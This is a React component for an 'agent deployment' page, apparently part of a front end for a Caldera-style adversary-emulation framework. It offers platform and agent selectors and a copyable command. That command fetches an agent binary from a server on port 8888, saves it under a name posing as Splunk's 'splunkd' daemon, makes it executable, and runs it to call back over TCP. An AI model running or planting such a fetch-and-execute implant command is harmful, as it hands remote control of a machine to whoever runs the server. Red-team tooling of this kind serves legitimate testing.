"use client";

import Selector from "@/components/Selector/Selector";
import ServerConfigEditor from "@/components/ServerConfigEditor/ServerConfigEditor";

const PlatformTypes = [
  { name: "Windows", icon: "/assets/icon-win.png" },
  { name: "Linux", icon: "/assets/icon-linux.png" },
  { name: "MAC OS", icon: "/assets/icon-apple.png" },
];

const AgentTypes = [
  { name: "Manx", icon: "/assets/cat-01.png" },
  { name: "Ragdoll", icon: "/assets/cat-02.png" },
  { name: "Sand Cat", icon: "/assets/cat-03.png" },
];

const text = `server=http://10.140.20.35:8888; socket="#http_proxy"; contact="tcp"; curl -s -X POST -H 'file:manx.go' -H 'platform:linux' $server/download > #splunkd; chmod +x #splunkd; #splunkd -http $server -socket $socket -contact $contact -v`;

export default function DeployAgent() {
  return (
    <div className="w-full space-y-6">
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 w-full">
        <Selector title="Choose Platform" options={PlatformTypes} />
        <Selector title="Choose Agent Type" options={AgentTypes} />
        <ServerConfigEditor />
      </div>

      <div className="border p-4 rounded-md flex-col gap-6 w-full">
        <div className="border-b-1 border-gray-300">
          <h2 className="font-bold mb-2">Modify Server Config</h2>
        </div>

        <div className="w-full">
          <textarea
            readOnly
            value={text}
            className="w-full h-48 rounded-md p-4 text-sm resize-none text-gray-200"
          />
          <div className="flex justify-end">
            <button
              className="bg-blue-600 hover:bg-blue-700 text-white text-sm px-5 py-2 rounded"
              onClick={() => {
                navigator.clipboard.writeText(text);
              }}
            >
              Copy
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
